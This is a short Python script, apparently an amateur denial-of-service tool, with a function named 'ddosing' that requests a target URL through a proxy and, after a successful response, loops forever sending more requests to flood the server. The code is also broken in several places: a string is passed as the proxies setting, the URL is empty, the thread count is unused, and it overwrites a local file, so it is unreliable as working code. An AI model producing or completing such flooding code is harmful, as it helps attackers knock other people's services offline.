from headers import headers
from threading import Thread


import requests, re


pr = int(input("Enter IP: "))

def int_to_ip_address(ip):
    a = (ip >> 24) & 255
    b = (ip >> 16) & 255
    c = (ip >> 8) & 255
    d = ip & 255
    return "{}.{}.{}.{}".format(a, b, c, d)

prt = int_to_ip_address(pr)

def check_proxy_address(proxy_address):

    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$'
    

    if re.match(pattern, proxy_address):
        return True
    else:
        return False

def ddosing(url, threads, proxy): 
    response = requests.get(url, proxies=proxy, headers=headers) 
    
    if check_proxy_address(proxy_address=proxy) == True:
         with open("proxy/proxy.py", 'w', encoding="utf-8") as file: 
             file.write(str(proxy))
         if response.status_code == 200: 
             while True: 
                 requests.get(url=url, proxies=proxy, headers=headers) 
    
    else: 
        return "[*] We have not correct proxy address [!]"




ddosing(url='', threads=300, proxy=prt)
